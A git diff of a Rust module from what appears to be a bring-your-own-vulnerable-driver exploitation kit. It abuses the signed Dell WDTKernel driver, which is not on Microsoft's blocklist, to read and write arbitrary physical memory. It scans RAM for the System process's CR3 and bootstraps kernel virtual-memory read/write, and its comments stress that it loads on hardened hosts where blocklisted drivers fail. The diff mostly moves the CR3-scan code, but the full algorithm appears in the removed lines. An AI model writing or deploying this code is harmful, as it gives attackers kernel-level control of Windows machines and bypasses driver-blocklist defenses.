@@ -2,7 +2,7 @@
 //!
 //! WDTKernel (Dell Watchdog Timer, LOLDrivers #290) is WHQL-signed and NOT
 //! on Microsoft's vulnerable-driver blocklist (`LoadsDespiteHVCI: TRUE`) — it
-//! loads where RTCore64 cannot (blocklisted → `NtLoadDriver` 0xC0000034 /
+//! loads where blocklisted drivers cannot (`NtLoadDriver` 0xC0000034 /
 //! 0xC0000428 on hardened hosts, verified on the GitHub windows-2022 image
 //! 2026-08-13). Its primitive is PHYSICAL-only: every IOCTL feeds a
 //! user-supplied physical address straight to `MmMapIoSpace`. This module:
@@ -30,25 +30,18 @@ use crate::byovd::{resolve_sym, DeviceIoControlFn, VulnDriverIoctl};
 use crate::byovd_drivers::wdtkernel::WdtKernel;
 use crate::offsets::EprocessOffsets;
 use crate::win::driver_load::LoadedDriver;
-use crate::win::pagewalk::{translate_va, PhysRead, PhysReadError};
+use crate::win::pagewalk::{PhysRead, PhysReadError};
 use crate::win::va_rw::{PhysWrite, VaKernelRw};
 use crate::{KitError, KrwError};
-use alloc::vec;
 use core::ffi::c_void;
 
-/// `_KPROCESS.DirectoryTableBase` — x64 offset inside `_EPROCESS`. KPROCESS
-/// is embedded at `_EPROCESS+0` and ABI-frozen; 0x28 on every build
-/// 10240–26200 (matches the pg-pdb-verify symbol-server pass).
-const DIRECTORY_TABLE_BASE_OFF: u64 = 0x28;
-
-/// Bytes per physical read during the CR3 scan (one MmMapIoSpace mapping).
-const SCAN_CHUNK: usize = 1024 * 1024;
+/// The CR3 scan is a pure algorithm in [`crate::cr3_scan`] (host-testable);
+/// re-exported here so `win::wdt::discover_system_cr3` keeps working with a
+/// live `WdtPhys` (`WdtPhys: PhysRead`).
+pub use crate::cr3_scan::discover_system_cr3;
 
 /// Cap per-IOCTL transfer — keeps the driver's MmMapIoSpace mappings small.
 const IOCTL_CHUNK: usize = 0x40000;
-
-/// Consecutive failed chunks before giving up (a long hole ⇒ past RAM end).
-const MAX_SCAN_FAILURES: u32 = 32;
 
 /// GENERIC_READ | GENERIC_WRITE.
 const GENERIC_RW: u32 = 0xC000_0000;
@@ -159,95 +152,6 @@ pub unsafe fn open_wdt() -> Result<WdtPhys, KrwError> {
     })
 }
 
-/// Scan physical RAM for the System EPROCESS and return its CR3.
-///
-/// `scan_budget_mb` caps the scan in MiB (default 2048 from the CLI). Scan
-/// strategy: read 1 MiB chunks from PA 0x1000 upward; inside each chunk,
-/// look for the ASCII `System\0` of `_EPROCESS.ImageFileName` at the
-/// build-specific offset. For each candidate (pool-aligned, PID 4), read
-/// `DirectoryTableBase`, then VALIDATE by walking the ntoskrnl base VA
-/// through it — the resolved physical page must start with `MZ`. Only a
-/// validated CR3 is returned; everything else is discarded.
-///
-/// # Safety
-/// Physical reads only. A bogus CR3 is never returned (validation gate).
-pub unsafe fn discover_system_cr3(
-    phys: &WdtPhys,
-    nt_base: u64,
-    ep: &EprocessOffsets,
-    scan_budget_mb: usize,
-) -> Option<u64> {
-    let budget = scan_budget_mb
-        .max(1)
-        .saturating_mul(1024 * 1024)
-        .max(SCAN_CHUNK) as u64;
-    let mut buf = vec![0u8; SCAN_CHUNK];
-    let mut pa: u64 = 0x1000;
-    let mut failures: u32 = 0;
-    while pa < budget {
-        let n = (budget - pa).min(SCAN_CHUNK as u64) as usize;
-        let chunk = &mut buf[..n];
-        if phys.read_phys(pa, chunk).is_err() {
-            failures += 1;
-            if failures >= MAX_SCAN_FAILURES {
-                break; // long hole ⇒ past the end of physical RAM
-            }
-            pa += n as u64;
-            continue;
-        }
-        failures = 0;
-
-        for i in 0..n.saturating_sub(7) {
-            if chunk[i..i + 7] != *b"System\x00" {
-                continue;
-            }
-            if i < ep.image_file_name {
-                continue;
-            }
-            let ep_pa = pa + (i - ep.image_file_name) as u64;
-            if ep_pa % 0x40 != 0 {
-                continue; // object allocation alignment
-            }
-            // Secondary structural check: the System process has PID 4.
-            let mut pid = [0u8; 8];
-            if phys
-                .read_phys(ep_pa + ep.unique_process_id as u64, &mut pid)
-                .is_err()
-            {
-                continue;
-            }
-            if u64::from_le_bytes(pid) != 4 {
-                continue;
-            }
-            // DirectoryTableBase at +0x28 (KPROCESS, ABI-frozen).
-            let mut dtb = [0u8; 8];
-            if phys
-                .read_phys(ep_pa + DIRECTORY_TABLE_BASE_OFF, &mut dtb)
-                .is_err()
-            {
-                continue;
-            }
-            let cr3 = u64::from_le_bytes(dtb) & 0x000F_FFFF_FFFF_F000;
-            if cr3 == 0 {
-                continue;
-            }
-            // Decisive validation: ntoskrnl base VA → PA via candidate CR3,
-            // and the mapped page must start with the DOS header.
-            match translate_va(phys, cr3, nt_base) {
-                Ok(nt_pa) => {
-                    let mut mz = [0u8; 2];
-                    if phys.read_phys(nt_pa, &mut mz).is_ok() && &mz == b"MZ" {
-                        return Some(cr3);
-                    }
-                }
-                Err(_) => {}
-            }
-        }
-        pa += n as u64;
-    }
-    None
-}
-
 /// Full WDT phys-mode bootstrap: load driver → open device → discover CR3 →
 /// wrap in [`VaKernelRw`]. Returns the loaded driver (cleanup) plus the
 /// VA-capable `KernelRw`.
@@ -277,7 +181,7 @@ pub unsafe fn bootstrap_wdt(
         }
     };
 
-    let cr3 = match unsafe { discover_system_cr3(&phys, nt_base, eprocess, scan_budget_mb) } {
+    let cr3 = match discover_system_cr3(&phys, nt_base, eprocess, scan_budget_mb) {
         Some(c) => c,
         None => {
             let mut l = loaded;
